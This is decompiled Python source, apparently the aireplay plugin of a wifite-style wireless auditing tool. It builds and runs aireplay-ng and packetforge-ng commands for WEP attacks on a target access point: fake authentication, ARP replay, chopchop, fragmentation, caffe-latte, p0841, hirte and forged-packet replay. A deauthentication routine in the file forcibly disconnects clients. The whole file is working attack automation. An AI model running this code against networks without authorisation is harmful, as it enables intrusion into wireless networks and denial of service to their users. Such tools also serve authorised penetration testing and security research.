# uncompyle6 version 3.7.4
# Python bytecode 3.6 (3379)
# Decompiled from: Python 3.6.9 (default, Apr 18 2020, 01:56:04) 
# [GCC 8.4.0]
# Embedded file name: build/bdist.linux-x86_64/egg/src/plugins/aireplay.py
# Compiled at: 2020-01-15 14:45:15
# Size of source mod 2**32: 18235 bytes
from .dependency import Dependency
from ..config import Configuration
from ..handlers.process import Process
from ..handlers.timer import Timer
import os, time, re
from threading import Thread

class WEPAttackType(object):
    __doc__ = ' Enumeration of different WEP attack types '
    fakeauth = 0
    replay = 1
    chopchop = 2
    fragment = 3
    caffelatte = 4
    p0841 = 5
    hirte = 6
    forgedreplay = 7

    def __init__(self, var):
        """
            Sets appropriate attack name/value given an input.
            Args:
                var - Can be a string, number, or WEPAttackType object
                      This object's name & value is set depending on var.
        """
        self.value = None
        self.name = None
        if type(var) is int:
            for name, value in WEPAttackType.__dict__.items():
                if type(value) is int:
                    if value == var:
                        self.name = name
                        self.value = value
                        return

            raise Exception('Attack number %d not found' % var)
        else:
            if type(var) is str:
                for name, value in WEPAttackType.__dict__.items():
                    if type(value) is int:
                        if name == var:
                            self.name = name
                            self.value = value
                            return

                raise Exception('Attack name %s not found' % var)
            else:
                if type(var) == WEPAttackType:
                    self.name = var.name
                    self.value = var.value
                else:
                    raise Exception('Attack type not supported')

    def __str__(self):
        return self.name


class Aireplay(Thread, Dependency):
    dependency_required = True
    dependency_name = 'aireplay-ng'
    dependency_url = 'https://www.aircrack-ng.org/install.html'

    def __init__(self, target, attack_type, client_mac=None, replay_file=None):
        """
            Starts aireplay process.
            Args:
                target - Instance of Target object, AP to attack.
                attack_type - str, e.g. 'fakeauth', 'arpreplay', etc.
                client_mac - MAC address of an associated client.
        """
        super(Aireplay, self).__init__()
        self.target = target
        self.output_file = Configuration.temp('aireplay_%s.output' % attack_type)
        self.attack_type = WEPAttackType(attack_type).value
        self.error = None
        self.status = None
        self.cmd = Aireplay.get_aireplay_command((self.target), attack_type,
          client_mac=client_mac,
          replay_file=replay_file)
        self.pid = Process((self.cmd), stdout=(open(self.output_file, 'a')),
          stderr=(Process.devnull()),
          cwd=(Configuration.temp()))
        self.start()

    def is_running(self):
        return self.pid.poll() is None

    def stop(self):
        """ Stops aireplay process """
        if hasattr(self, 'pid'):
            if self.pid:
                if self.pid.poll() is None:
                    self.pid.interrupt()

    def get_output(self):
        """ Returns stdout from aireplay process """
        return self.stdout

    def run(self):
        self.stdout = ''
        self.xor_percent = '0%'
        while self.pid.poll() is None:
            time.sleep(0.1)
            if not os.path.exists(self.output_file):
                pass
            else:
                with open(self.output_file, 'r+') as (fid):
                    lines = fid.read()
                    self.stdout += lines
                    fid.seek(0)
                    fid.truncate()
                if Configuration.verbose > 1:
                    if lines.strip() != '':
                        from ..handlers.color import Color
                        Color.pl('\n{P} [?] aireplay output:\n     %s{W}' % lines.strip().replace('\n', '\n     '))
                for line in lines.split('\n'):
                    line = line.replace('\r', '').strip()
                    if line == '':
                        pass
                    else:
                        if 'Notice: got a deauth/disassoc packet' in line:
                            self.error = 'Not associated (needs fakeauth)'
                        if self.attack_type == WEPAttackType.fakeauth:
                            if 'Sending Authentication Request ' in line:
                                self.status = None
                            else:
                                if 'Please specify an ESSID' in line:
                                    self.status = None
                                else:
                                    if 'Got a deauthentication packet!' in line:
                                        self.status = False
                                    elif 'association successful :-)' in line.lower():
                                        self.status = True
                        else:
                            if self.attack_type == WEPAttackType.chopchop:
                                read_re = re.compile('Read (\\d+) packets')
                                matches = read_re.match(line)
                                if matches:
                                    self.status = 'Waiting for packet (read %s)...' % matches.group(1)
                                sent_re = re.compile('Sent (\\d+) packets, current guess: (\\w+)...')
                                matches = sent_re.match(line)
                                if matches:
                                    self.status = 'Generating .xor (%s)... current guess: %s' % (self.xor_percent, matches.group(2))
                                offset_re = re.compile('Offset.*\\(\\s*(\\d+%) done\\)')
                                matches = offset_re.match(line)
                                if matches:
                                    self.xor_percent = matches.group(1)
                                    self.status = 'Generating .xor (%s)...' % self.xor_percent
                                saving_re = re.compile('Saving keystream in (.*\\.xor)')
                                matches = saving_re.match(line)
                                if matches:
                                    self.status = matches.group(1)
                                if 'try running aireplay-ng in authenticated mode' in line:
                                    self.status = 'fakeauth is required and you are not authenticated'
                            else:
                                if self.attack_type == WEPAttackType.fragment:
                                    read_re = re.compile('Read (\\d+) packets')
                                    matches = read_re.match(line)
                                    if matches:
                                        self.status = 'Waiting for packet (read %s)...' % matches.group(1)
                                    if 'Waiting for a data packet' in line:
                                        self.status = 'waiting for packet'
                                    trying_re = re.compile('Trying to get (\\d+) bytes of a keystream')
                                    matches = trying_re.match(line)
                                    if matches:
                                        self.status = 'trying to get %sb of a keystream' % matches.group(1)
                                    if 'Sending fragmented packet' in line:
                                        self.status = 'sending packet'
                                    if 'Still nothing, trying another packet' in line:
                                        self.status = 'sending another packet'
                                    trying_re = re.compile('Trying to get (\\d+) bytes of a keystream')
                                    matches = trying_re.match(line)
                                    if matches:
                                        self.status = 'trying to get %sb of a keystream' % matches.group(1)
                                    if 'Got RELAYED packet' in line:
                                        self.status = 'got relayed packet'
                                    if 'Thats our ARP packet' in line:
                                        self.status = 'relayed packet was our'
                                    saving_re = re.compile('Saving keystream in (.*\\.xor)')
                                    matches = saving_re.match(line)
                                    if matches:
                                        self.status = 'saving keystream to %s' % matches.group(1)
                                    else:
                                        read_re = re.compile('Read (\\d+) packets \\(got (\\d+) ARP requests and (\\d+) ACKs\\), sent (\\d+) packets...\\((\\d+) pps\\)')
                                        matches = read_re.match(line)
                                        if matches:
                                            pps = matches.group(5)
                                            if pps == '0':
                                                self.status = 'Waiting for packet...'
                                            else:
                                                self.status = 'Replaying @ %s/sec' % pps

    def __del__(self):
        self.stop()

    @staticmethod
    def get_aireplay_command(target, attack_type, client_mac=None, replay_file=None):
        """
            Generates aireplay command based on target and attack type
            Args:
                target      - Instance of Target object, AP to attack.
                attack_type - int, str, or WEPAttackType instance.
                client_mac  - MAC address of an associated client.
                replay_file - .Cap file to replay via --arpreplay
        """
        Configuration.initialize()
        if Configuration.interface is None:
            raise Exception('Wireless interface must be defined (-i)')
        cmd = ['aireplay-ng']
        cmd.append('--ignore-negative-one')
        if client_mac is None:
            if len(target.clients) > 0:
                client_mac = target.clients[0].station
        attack_type = WEPAttackType(attack_type).value
        if attack_type == WEPAttackType.fakeauth:
            cmd.extend([
             '--fakeauth', '30',
             '-Q',
             '-a', target.bssid])
            if target.essid_known:
                cmd.extend(['-e', target.essid])
        elif attack_type == WEPAttackType.replay:
            cmd.extend([
             '--arpreplay',
             '-b', target.bssid,
             '-x', str(Configuration.wep_pps)])
            if client_mac:
                cmd.extend(['-h', client_mac])
        else:
            if attack_type == WEPAttackType.chopchop:
                cmd.extend([
                 '--chopchop',
                 '-b', target.bssid,
                 '-x', str(Configuration.wep_pps),
                 '-F'])
                if client_mac:
                    cmd.extend(['-h', client_mac])
            else:
                if attack_type == WEPAttackType.fragment:
                    cmd.extend([
                     '--fragment',
                     '-b', target.bssid,
                     '-x', str(Configuration.wep_pps),
                     '-m', '100',
                     '-F'])
                    if client_mac:
                        cmd.extend(['-h', client_mac])
                else:
                    if attack_type == WEPAttackType.caffelatte:
                        if len(target.clients) == 0:
                            raise Exception('Client is required for caffe-latte attack')
                        cmd.extend([
                         '--caffe-latte',
                         '-b', target.bssid,
                         '-h', target.clients[0].station])
                    else:
                        if attack_type == WEPAttackType.p0841:
                            cmd.extend([
                             '--arpreplay',
                             '-b', target.bssid,
                             '-c', 'ff:ff:ff:ff:ff:ff',
                             '-x', str(Configuration.wep_pps),
                             '-F',
                             '-p', '0841'])
                            if client_mac:
                                cmd.extend(['-h', client_mac])
                        else:
                            if attack_type == WEPAttackType.hirte:
                                if client_mac is None:
                                    raise Exception('Client is required for hirte attack')
                                cmd.extend([
                                 '--cfrag',
                                 '-h', client_mac])
                            else:
                                if attack_type == WEPAttackType.forgedreplay:
                                    if client_mac is None or replay_file is None:
                                        raise Exception('Client_mac and Replay_File are required for arp replay')
                                    cmd.extend([
                                     '--arpreplay',
                                     '-b', target.bssid,
                                     '-h', client_mac,
                                     '-r', replay_file,
                                     '-F',
                                     '-x', str(Configuration.wep_pps)])
                                else:
                                    raise Exception('Unexpected attack type: %s' % attack_type)
            cmd.append(Configuration.interface)
            return cmd

    @staticmethod
    def get_xor():
        """ Finds the last .xor file in the directory """
        xor = None
        for fil in os.listdir(Configuration.temp()):
            if fil.startswith('replay_') and fil.endswith('.xor') or fil.startswith('fragment-') and fil.endswith('.xor'):
                xor = fil

        return xor

    @staticmethod
    def forge_packet(xor_file, bssid, station_mac):
        """ Forges packet from .xor file """
        forged_file = 'forged.cap'
        cmd = [
         'packetforge-ng',
         '-0',
         '-a', bssid,
         '-h', station_mac,
         '-k', '192.168.1.2',
         '-l', '192.168.1.100',
         '-y', xor_file,
         '-w', forged_file,
         Configuration.interface]
        cmd = '"%s"' % '" "'.join(cmd)
        out, err = Process.call(cmd, cwd=(Configuration.temp()), shell=True)
        if out.strip() == 'Wrote packet to: %s' % forged_file:
            return forged_file
        else:
            from ..handlers.color import Color
            Color.pl('{!} {R}failed to forge packet from .xor file{W}')
            Color.pl('output:\n"%s"' % out)
            return

    @staticmethod
    def deauth(target_bssid, essid=None, client_mac=None, num_deauths=None, timeout=2):
        num_deauths = num_deauths or Configuration.num_deauths
        deauth_cmd = [
         'aireplay-ng',
         '-0',
         str(num_deauths),
         '--ignore-negative-one',
         '-a', target_bssid,
         '-D']
        if client_mac is not None:
            deauth_cmd.extend(['-c', client_mac])
        if essid:
            deauth_cmd.extend(['-e', essid])
        deauth_cmd.append(Configuration.interface)
        proc = Process(deauth_cmd)
        while proc.poll() is None:
            if proc.running_time() >= timeout:
                proc.interrupt()
            time.sleep(0.2)

    @staticmethod
    def fakeauth(target, timeout=5, num_attempts=3):
        """
        Tries a one-time fake-authenticate with a target AP.
        Params:
            target (py.Target): Instance of py.Target
            timeout (int): Time to wait for fakeuth to succeed.
            num_attempts (int): Number of fakeauth attempts to make.
        Returns:
            (bool): True if fakeauth succeeds, otherwise False
        """
        cmd = [
         'aireplay-ng',
         '-1', '0',
         '-a', target.bssid,
         '-T', str(num_attempts)]
        if target.essid_known:
            cmd.extend(['-e', target.essid])
        cmd.append(Configuration.interface)
        fakeauth_proc = Process(cmd, devnull=False,
          cwd=(Configuration.temp()))
        timer = Timer(timeout)
        while fakeauth_proc.poll() is None and not timer.ended():
            time.sleep(0.1)

        if fakeauth_proc.poll() is None or timer.ended():
            fakeauth_proc.interrupt()
            return False
        else:
            output = fakeauth_proc.stdout()
            return 'association successful' in output.lower()


if __name__ == '__main__':
    t = WEPAttackType(4)
    print(t.name, type(t.name), t.value)
    t = WEPAttackType('caffelatte')
    print(t.name, type(t.name), t.value)
    t = WEPAttackType(t)
    print(t.name, type(t.name), t.value)